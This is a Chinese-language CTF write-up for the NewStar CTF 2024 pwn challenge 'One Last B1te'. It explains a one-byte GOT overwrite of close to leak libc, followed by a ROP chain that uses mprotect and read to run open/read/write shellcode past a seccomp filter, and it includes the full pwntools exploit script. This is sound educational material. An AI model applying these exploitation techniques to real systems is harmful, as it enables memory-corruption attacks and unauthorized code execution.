---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# One Last B1te

先查保护和沙箱：

```asm
[*] '/home/?????/PWN/NewStar2024-test/hackgot/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x03 0x00 0x00000028  if (A == sendfile) goto 0009
 0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009
 0007: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
```

没有 PIE，没有 anary，Partial RELRO，意味着存在延迟绑定 + GOT 表可写。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+8h] [rbp-18h] BYREF
  _BYTE v5[16]; // [rsp+10h] [rbp-10h] BYREF

  init(argc, argv, envp);
  sandbox();
  write(1, "Show me your UN-Lucky number : ", 0x20uLL);
  read(0, &buf, 8uLL);  // 读入一个地址
  write(1, "Try to hack your UN-Lucky number with one byte : ", 0x32uLL);
  read(0, buf, 1uLL);   // 往上面读入的地址中写入一个字符
  read(0, v5, 0x110uLL);// 往栈上读入内容，有栈溢出
  close(1);             // 关闭stdout
  return 0;
}
```

有一次任意地址写的机会。

程序在新版 Ubuntu 24 下编译，优化掉了 CSU，此时我们很难利用 ELF 的 gadget 来 ROP.

我们想办法泄露 libc 地址或者 ld 地址然后利用 libc/ld 中的 gadget 来 ROP，执行 open + read + write 来输出 flag 文件内容。

程序中只有 `write` 函数可以进行输出，我们可以利用一个字节任意地址写的机会，把 `close` 函数的 GOT 表的数值改为`write`函数的 PLT 表的地址（因为存在延迟绑定，`close` 在第一次调用之前指向的是 PLT 中的表项，我们很容易利用修改最低一个字节的方法来使其指向 `write` 函数的 PLT 表）。

之后由于 `close(1)` 设置第一个参数为 1，同时 `read(0, v5, 0x110uLL);` 会残留第 2、3 个参数，我们修改 `close` 的 GOT 表之后相当于执行 `write(1,v5,0x110uLL);`，就可以泄露栈上的内容，正好能泄露 libc 地址，之后利用栈溢出再次启动 `main` 函数栈溢出 ROP 即可。

由于 glibc 2.39 版本不容易控制 rdx 寄存器，我们可以使用 `pop rax` + `xchg eax, edx` 的方法来设置 rdx 寄存器的数值。

```python
# sudo sysctl -w kernel.randomize_va_space=0
# gcc pwn.c -o pwn -masm=intel -no-pie -fno-stack-protector -l seccomp
from pwn import*
from Crypto.Util.number import long_to_bytes, bytes_to_long

context.log_level='debug'
context(arch='amd64',os='linux')
context.terminal=['tmux','splitw','-h']

ELFpath = './pwn'
p=remote('localhost',11451)
#p=process(['./ld-2.31.so', ELFpath], env={"LD_PRELOAD":'./libc-2.31.so'})
# p=process(ELFpath)

close_got=0x404028
write_plt=0x4010c0

p.sendafter("Show me your UN-Lucky number :",p64(close_got))
p.sendafter("Try to hack your UN-Lucky number with one byte :",b'\xc0')
ret=0x0401447
main=0x4013a3
rubbish=0x404000+0x800
payload=b'a'*0x18+p64(ret)+p64(main)
pause()

p.send(payload)
p.recvuntil(b'a'*0x18)
p.recv(0xb8-0x18)
libc_base=u64(p.recv(6)+b'\x00\x00')-0x710b26c2a28b+0x710b26c00000

p.sendafter("Show me your UN-Lucky number :",p64(rubbish))

p.sendafter("Try to hack your UN-Lucky number with one byte :",b'\x70')

pop_rdi=libc_base+0x010f75b
pop_rsi=libc_base+0x110a4d
binsh=libc_base+0x1cb42f

xchg_edx_eax=libc_base+0x01a7f27

pop_rax=libc_base+0x0dd237

open_a=libc_base+0x011B120
read_a=libc_base+0x011BA50
mprotect=libc_base+0x00125C10

payload=b'a'*0x18+p64(pop_rdi)+p64(libc_base+0x202000)+p64(pop_rsi)+p64(0x2000)+p64(pop_rax)+p64(7)+p64(xchg_edx_eax)+p64(mprotect)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(libc_base+0x202000)+p64(pop_rax)+p64(0x1000)+p64(xchg_edx_eax)+p64(read_a)+p64(libc_base+0x202000)

pause()

p.send(payload)

pause()

shellcode=''
shellcode+=shellcraft.open('./flag',0,0)
shellcode+=shellcraft.read('rax',libc_base+0x202000+0x800,0x100)
shellcode+=shellcraft.write(2,libc_base+0x202000+0x800,'rax')
# gdb.attach(p)
p.send(asm(shellcode))

p.interactive()
```
